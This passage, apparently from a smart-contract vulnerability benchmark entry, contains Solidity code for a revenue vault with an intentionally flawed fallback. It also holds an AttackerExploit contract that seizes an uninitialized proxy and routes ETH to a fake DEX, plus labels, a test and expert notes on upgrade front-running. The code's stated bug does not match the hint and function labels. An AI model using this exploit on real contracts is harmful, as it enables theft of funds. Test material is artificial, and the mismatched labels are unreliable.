VULNERABILITY: Does not enforce msg.value > 0\n   *      Also, deployment script mistakenly calls this instead of initialize()\n   *      When deployProxy calls 'initialize()' with no params, it routes here\n   *      because no matching function signature exists\n   */\n  fallback() external payable {\n    // BUG: Missing require(msg.value > 0, NoEthSent());\n    // This allows zero-value calls to succeed and emit events\n    // More critically, deployment script calls route here, appearing to succeed\n    // while leaving the contract completely uninitialized\n    emit EthReceived(msg.value);\n  }\n}\n\ninterface IERC20 {\n  function approve(address spender, uint256 amount) external returns (bool);\n}\n\n/**\n * @title AttackerExploit\n * @notice Demonstrates the uninitialized contract takeover\n */\ncontract AttackerExploit {\n  RollupRevenueVault public vault;\n  \n  constructor(address _vaultProxy) {\n    vault = RollupRevenueVault(payable(_vaultProxy));\n  }\n  \n  /**\n   * @notice Exploit the uninitialized contract\n   * @dev After deployment script fails to initialize, anyone can claim it\n   */\n  function exploit() external {\n    // Contract was deployed but initialize() call routed to fallback\n    // Now we can initialize with our own parameters\n    \n    address attacker = msg.sender;\n    address maliciousDex = address(this); // Our controlled DEX\n    address maliciousL1Burner = address(this);\n    \n    // Initialize with attacker as admin and all roles\n    vault.initialize(\n      block.timestamp, // lastInvoiceDate\n      attacker, // defaultAdmin - gives us full control\n      attacker, // invoiceSubmitter\n      attacker, // burner\n      attacker, // invoicePaymentReceiver - we receive all payments\n      address(0x1), // dummy tokenBridge\n      address(0x2), // dummy messageService\n      maliciousL1Burner, // our controlled L1 burner\n      address(0x3), // dummy lineaToken\n      maliciousDex // our controlled DEX - we can steal all ETH\n    );\n    \n    // Now we control the entire contract:\n    // - Can submit fake invoices and receive payments\n    // - Can execute burns that route through our malicious DEX\n    // - Can update critical addresses at will\n    // - All ETH sent to the vault is under our control\n  }\n  \n  /**\n   * @notice Malicious DEX swap function\n   * @dev Steals all ETH sent for \"swapping\"\n   */\n  fallback() external payable {\n    // Pretend to swap but just keep the ETH\n    // Return fake LINEA token amount\n  }\n}",
      "vulnerable_lines": [
        97,
        98,
        99,
        100,
        101,
        102,
        103,
        104,
        105,
        106,
        107,
        108,
        109,
        110,
        111,
        112,
        113,
        114,
        115,
        116,
        117,
        118,
        119,
        120,
        121,
        122,
        123,
        125,
        126,
        127,
        128,
        129,
        130,
        131,
        132,
        133,
        134,
        135,
        136,
        137,
        138,
        139,
        140,
        141,
        142,
        143,
        144,
        145,
        146,
        147,
        148,
        149,
        150,
        151,
        152,
        153,
        154,
        155,
        156,
        157,
        158,
        159,
        160,
        161,
        162,
        163,
        164,
        165,
        166,
        167,
        168
      ],
      "vulnerable_functions": [
        "initializeRolesAndStorageVariables",
        "__RollupRevenueVault_init"
      ]
    },
    "context_files": [
      {
        "path": "contracts/test/hardhat/operational/RollupRevenueVault.ts",
        "content": "import { ethers } from \"hardhat\";\nimport { expect } from \"chai\";\nimport { time } from \"@nomicfoundation/hardhat-network-helpers\";\n\ndescribe(\"RollupRevenueVault\", () => {\n  // ... setup hooks and other tests\n\n  it(\"Should revert when reinitializing twice\", async () => {\n    // This test illustrates the vulnerable pattern.\n    // A reinitialization is called in a separate transaction after the initial one.\n    // If this were an upgrade, an attacker could front-run this call.\n    const { \n      rollupRevenueVault, \n      admin, \n      invoiceSubmitter, \n      burner, \n      invoicePaymentReceiver, \n      tokenBridge, \n      messageService, \n      l1LineaTokenBurner, \n      l2LineaToken, \n      dex \n    } = await loadFixture(deployAndInitializeFixture);\n\n    const txPromise = rollupRevenueVault.initializeRolesAndStorageVariables(\n      await time.latest(),\n      admin.address,\n      invoiceSubmitter.address,\n      burner.address,\n      invoicePaymentReceiver.address,\n      await tokenBridge.getAddress(),\n      await messageService.getAddress(),\n      l1LineaTokenBurner.address,\n      await l2LineaToken.getAddress(),\n      await dex.getAddress(),\n    );\n\n    // In a real upgrade, an attacker could have already called this.\n    // The test expects it to fail because it's being called a second time,\n    // but the vulnerability is that an attacker could be the *first* to call it post-upgrade.\n    await expect(txPromise).to.be.revertedWith(\"Initializable: contract is already initialized\");\n  });\n});",
        "relevance": "The audit report points to this test file as evidence of a potential vulnerability. It shows the reinitializer function being called in a separate transaction, not atomically with an upgrade. This pattern, if used in a real upgrade scenario, creates a window of opportunity for an attacker to front-run the call and take control of the contract by setting themselves as the new admin."
      }
    ],
    "call_flow": "Admin executes `upgradeTo(V2_Implementation)` -> Window of opportunity opens post-upgrade but pre-reinitialization -> Attacker front-runs by calling `initializeRolesAndStorageVariables()` with malicious parameters -> Attacker is granted `DEFAULT_ADMIN_ROLE` and other roles -> Original admins and attacker now share privileges -> Attacker can execute malicious operations like updating the DEX to a malicious contract or submitting fake invoices.",
    "context_hint": "This vulnerability stems from the upgrade process for a proxy contract. The `reinitializer(2)` function is designed for upgrades but is left publicly callable after an upgrade transaction is completed. If the upgrade and reinitialization are not performed in a single, atomic transaction (using `upgradeToAndCall`), a front-running window is created. An attacker can watch the mempool for an `upgradeTo` transaction and immediately submit their own call to `initializeRolesAndStorageVariables`, granting themselves administrative roles. The problem is compounded because the internal `__RollupRevenueVault_init` function resets critical state variables (like `lastInvoiceDate`) and only grants new roles without revoking old ones, leading to both state corruption and privilege escalation where the attacker shares control with the legitimate admins.",
    "is_vulnerable": true,
    "expert_notes": "This is a classic vulnerability pattern in the management of upgradeable contracts, extending the well-known 'deploy-and-initialize' race condition to the 'upgrade-and-reinitialize' cycle. Key takeaways: 1) Upgrades must be atomic. The `upgradeTo` and re-initializer calls must be bundled into a single transaction (e.g., `upgradeToAndCall`) to prevent front-running. 2) Initialization logic should be version-specific. Re-using a broad initializer like `__RollupRevenueVault_init` for upgrades is dangerous as it can reset critical state and handle roles improperly. An upgrade should only touch the state it absolutely needs to. 3) Role management during upgrades must be explicit. To replace an admin, the old admin role should be revoked before the new one is granted. Additive role grants are a security risk. 4) The `reinitializer(N)` modifier from OpenZeppelin is a powerful tool, but it doesn't protect against front-running if the execution flow isn't atomic. This finding highlights that the security of upgradeable contracts depends heavily on secure off-chain deployment and upgrade procedures, not just the on-chain code itself."
  }
]